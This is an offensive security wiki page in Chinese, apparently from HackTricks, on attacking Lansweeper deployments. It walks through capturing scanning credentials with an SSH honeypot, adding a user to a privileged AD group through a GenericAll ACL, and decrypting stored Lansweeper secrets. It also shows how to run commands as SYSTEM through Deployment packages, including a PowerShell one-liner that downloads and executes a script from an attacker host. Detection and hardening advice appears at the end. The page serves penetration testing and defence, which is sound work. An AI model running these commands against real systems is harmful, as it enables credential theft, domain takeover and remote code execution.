# Lansweeper 滥用：凭据窃取、Secrets 解密与 Deployment RCE

{{#include ../../banners/hacktricks-training.md}}

Lansweeper 是一个 IT 资产发现与清单平台，通常部署在 Windows 上并与 Active Directory 集成。Lansweeper 中配置的凭据由其扫描引擎使用，通过 SSH、SMB/WMI 和 WinRM 等协议向资产进行身份验证。错误配置通常会导致：

- 通过将扫描目标重定向到攻击者控制的主机（蜜罐）来拦截凭据
- 滥用 Lansweeper 相关组暴露的 AD ACL，以获取远程访问权限
- 在主机上解密 Lansweeper 配置的 Secrets（连接字符串和存储的扫描凭据）
- 通过 Deployment 功能在受管理端点上执行代码（通常以 SYSTEM 身份运行）

本页总结了在 engagement 期间滥用这些行为的实用攻击流程和命令。

## 1) 通过蜜罐窃取扫描凭据（SSH 示例）

思路：创建一个指向你主机的 Scanning Target，并将现有的 Scanning Credentials 映射到该目标。扫描运行时，Lansweeper 会尝试使用这些凭据进行身份验证，而你的蜜罐将捕获这些凭据。<sup>[[1]](#references)</sup>

步骤概览（Web UI）：
- Scanning → Scanning Targets → Add Scanning Target
- Type：IP Range（或 Single IP）= 你的 VPN IP
- 将 SSH 端口配置为可访问的端口（例如 22 被阻止时使用 2022）
- 禁用计划并准备手动触发
- Scanning → Scanning Credentials → 确保存在 Linux/SSH 凭据；将其映射到新目标（根据需要启用全部凭据）
- 在目标上点击 “Scan now”
- 运行 SSH 蜜罐并获取尝试使用的用户名/密码

使用 sshesame 的示例：<sup>[[2]](#references)</sup>
```yaml
# sshesame.yaml
server:
listen_address: 0.0.0.0:2022
```

```bash
# Prefer a current release/container; the package in Debian-derived repositories may be stale
sshesame -config sshesame.yaml

# Or run the maintained container image
docker run --rm -it -p 2022:2022 \
-v "$PWD/sshesame.yaml:/config.yaml:ro" ghcr.io/jaksi/sshesame
# Expect client banner similar to RebexSSH and cleartext creds
# authentication for user "svc_inventory_lnx" with password "<password>" accepted
# connection with client version "SSH-2.0-RebexSSH_5.0.x" established
```
针对 DC 服务验证捕获的凭据：
```bash
# SMB/LDAP/WinRM checks (NetExec)
netexec smb   inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
netexec ldap  inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
netexec winrm inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
```
说明
- 其他协议并不等价：SMB/WinRM listener 通常获取的是 NTLM challenge-response，而不是明文密码。对其进行 cracking 或 relay 取决于协商的协议保护措施；请参阅 [network poisoning and relay attacks](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)。SSH password authentication 通常是最简单的明文场景。
- SSH public-key authentication 会向服务器暴露 username 和 public-key fingerprint，**而不是** private key 或其 passphrase。应从被 compromise 的 Lansweeper server 中恢复基于 key 的 credentials，而不是指望 honeypot 泄露这些信息。<sup>[[2]](#references)</sup>
- 许多 scanners 会使用独特的 client banners（例如 RebexSSH）标识自身，并会尝试执行 benign commands（uname、whoami 等）。

### Credential selection order 很重要

对于 rescan，Lansweeper 会先重试该 asset 上次成功使用的 credential，然后按照显式映射 credentials 的配置顺序进行尝试，最后使用同类型的 global credential。因此，接受第一个 password authentication 的 honeypot 通常不会观察到后续的 fallback credentials；在经过授权的 credential-path assessment 中，如果目标是验证完整的 fallback sequence，则应记录并拒绝这些尝试。<sup>[[6]](#references)</sup>

## 2) AD ACL abuse：通过将自己添加到 app-admin group 来获得 remote access

使用 BloodHound 枚举被 compromise 的 account 所拥有的 effective rights。常见发现是：某个 scanner-或 app-specific group（例如“Lansweeper Discovery”）对 privileged group（例如“Lansweeper Admins”）拥有 GenericAll。如果 privileged group 同时属于“Remote Management Users”，那么将自己添加进去后即可使用 WinRM。<sup>[[1]](#references)[[5]](#references)</sup>

Collection examples:
```bash
# NetExec collection with LDAP
netexec ldap inventory.sweep.vl -u svc_inventory_lnx -p '<password>' --bloodhound -c All --dns-server <DC_IP>

# RustHound-CE collection (zip for BH CE import)
rusthound-ce --domain sweep.vl -u svc_inventory_lnx -p '<password>' -c All --zip
```
使用 BloodyAD (Linux) 利用组上的 GenericAll：<sup>[[4]](#references)</sup>
```bash
# Add our user into the target group
bloodyAD --host inventory.sweep.vl -d sweep.vl -u svc_inventory_lnx -p '<password>' \
add groupMember "Lansweeper Admins" svc_inventory_lnx

# Confirm WinRM access if the group grants it
netexec winrm inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
```
然后获取一个交互式 shell：
```bash
evil-winrm -i inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
```
提示：Kerberos 操作对时间敏感。如果遇到 KRB_AP_ERR_SKEW，请先与 DC 同步：
```bash
sudo ntpdate <dc-fqdn-or-ip>   # or rdate -n <dc-ip>
```
## 3) 解密主机上由 Lansweeper 配置的 secrets

在 Lansweeper server 上，ASP.NET site 通常会存储一个加密的 connection string，以及应用程序使用的 symmetric key。通过适当的本地访问权限，你可以解密 DB connection string，然后提取已存储的 scanning credentials。<sup>[[1]](#references)</sup>

典型位置：
- Web config：`C:\Program Files (x86)\Lansweeper\Website\web.config`
- `<connectionStrings configProtectionProvider="DataProtectionConfigurationProvider">` … `<EncryptedData>…`
- Application key：`C:\Program Files (x86)\Lansweeper\Key\Encryption.txt`

使用 SharpLansweeperDecrypt 自动解密并导出已存储的 creds。不带参数时，当前 executable 会解密 `web.config`，连接到 database，并导出所有已配置的 scanning credentials；当已有加密值和 key file 时，`-e` 还支持离线/手动解密：<sup>[[3]](#references)</sup>
```powershell
# Automatic: use the default web.config and Encryption.txt locations
.\SharpLansweeperDecrypt.exe

# Manual: decrypt one database value with an explicit key file
.\SharpLansweeperDecrypt.exe -e '<encrypted-base64-value>' `
-p 'C:\Program Files (x86)\Lansweeper\Key\Encryption.txt'

# The repository also provides LansweeperDecrypt.ps1 when loading .NET tooling is unsuitable
powershell -ExecutionPolicy Bypass -File .\LansweeperDecrypt.ps1
```
预期输出包括 DB 连接详细信息以及明文扫描凭据，例如整个环境中使用的 Windows 和 Linux 账户。这些账户通常在域主机上拥有提升的本地权限：
```text
Inventory Windows  SWEEP\svc_inventory_win  <StrongPassword!>
Inventory Linux    svc_inventory_lnx        <StrongPassword!>
```
使用恢复的 Windows 扫描凭据获取特权访问：
```bash
netexec winrm inventory.sweep.vl -u svc_inventory_win -p '<StrongPassword!>'
# Typically local admin on the Lansweeper-managed host; often Administrators on DCs/servers
```
## 4) Lansweeper Deployment → SYSTEM RCE

作为“Lansweeper Admins”的成员，Web UI 会显示 Deployment 和 Configuration。在 Deployment → Deployment packages 下，你可以创建在目标资产上运行任意命令的 package。Lansweeper 使用管理扫描凭据访问目标的 Task Scheduler 和 `C$`，然后为该 deployment 创建任务。当 package 使用 **System Account** 运行模式时，payload 会以 `NT AUTHORITY\SYSTEM` 身份执行；其他运行模式可以使用映射的扫描凭据或当前登录用户，因此请确认所选模式，不要默认其会以 SYSTEM 身份运行。<sup>[[1]](#references)[[7]](#references)</sup>

高级步骤：
- 创建一个新的 Deployment package，使其运行 PowerShell 或 cmd one-liner（reverse shell、add-user 等）。
- 指定目标 asset（例如运行 Lansweeper 的 DC/host），然后点击 Deploy/Run now。
- 以 SYSTEM 身份接收 shell。

示例 payload（PowerShell）：
```powershell
# Simple test
powershell -nop -w hidden -c "whoami > C:\Windows\Temp\ls_whoami.txt"

# Reverse shell example (adapt to your listener)
powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://<attacker>/rs.ps1')"
```
OPSEC
- Deployment 操作噪声较大，并会在 Lansweeper 和 Windows 事件日志中留下记录。请谨慎使用。

### Deployment artifacts and a second credential exposure point

scanner 会通过 `C$` 将其 deployment executable 写入 `C:\Windows\LSDeployment`。Package 文件通常从 `DefaultPackageShare$` 读取，该共享由 `C:\Program Files (x86)\Lansweeper\PackageShare` 提供，或从特定 IP 范围的 package share 读取。重要的是，Lansweeper 文档指出，package-share credential 会以**可逆加密形式存储在每台接收 deployment 的计算机的 registry 中**。应将被攻陷的 managed endpoint 视为该 share account 的潜在泄露点；在重建 Lansweeper 活动时，应检查 deployment directory、scheduled-task history 和已配置的 package shares。<sup>[[7]](#references)</sup>

## Detection and hardening

- 限制或移除 anonymous SMB enumerations。监控 RID cycling 以及对 Lansweeper shares 的异常访问。
- Egress controls：阻止或严格限制 scanner hosts 发起的 outbound SSH/SMB/WinRM。对非标准端口（例如 2022）以及类似 Rebex 的异常 client banners 触发告警。
- 保护 `Website\\web.config` 和 `Key\\Encryption.txt`。将 secrets 外置到 vault，并在暴露后进行轮换。在可行的情况下，考虑使用权限最小化的 service accounts 和 gMSA。
- AD monitoring：监控 Lansweeper 相关 groups（例如 “Lansweeper Admins”、“Remote Management Users”）的变更，以及向 privileged groups 授予 GenericAll/Write membership 的 ACL 变更。
- 审计 Deployment package 的创建/变更/执行，并将新的 remote scheduled tasks 与对 `C:\Windows\LSDeployment` 的写入进行关联；对于启动 `cmd.exe`/`powershell.exe` 或发起异常 outbound connections 的 packages 触发告警。
- Package-share credentials 仅授予 **Read & Execute** 权限，绝不要将其用于 administration。在实际可行时优先使用 agent-based inventory：如果所有计算机都通过 agent 扫描且未使用 deployment module，Lansweeper 无需存储 computer scanning credentials。<sup>[[6]](#references)[[7]](#references)</sup>

## Related topics
- [SMB/LSA/SAMR enumeration and RID cycling](../../network-services-pentesting/pentesting-smb/rpcclient-enumeration.md)
- [Kerberos authentication and clock-skew considerations](kerberos-authentication.md)
- [BloodHound path analysis](bloodhound.md)
- [WinRM usage and lateral movement](../lateral-movement/winrm.md)



## References
- [1] [HTB：Sweep — 滥用 Lansweeper scanning、AD ACLs 和 secrets 控制 DC（0xdf）](https://0xdf.gitlab.io/2025/08/14/htb-sweep.html)
- [2] [sshesame（SSH honeypot）](https://github.com/jaksi/sshesame)
- [3] [SharpLansweeperDecrypt](https://github.com/Yeeb1/SharpLansweeperDecrypt)
- [4] [BloodyAD](https://github.com/CravateRouge/bloodyAD)
- [5] [BloodHound CE](https://github.com/SpecterOps/BloodHound)
- [6] [创建并映射 scanning credentials — Lansweeper Classic](https://docs.lansweeper.com/classic/docs/create-and-map-scanning-credentials)
- [7] [Deployment requirements — Lansweeper Classic](https://docs.lansweeper.com/classic/docs/deployment-requirements)
{{#include ../../banners/hacktricks-training.md}}
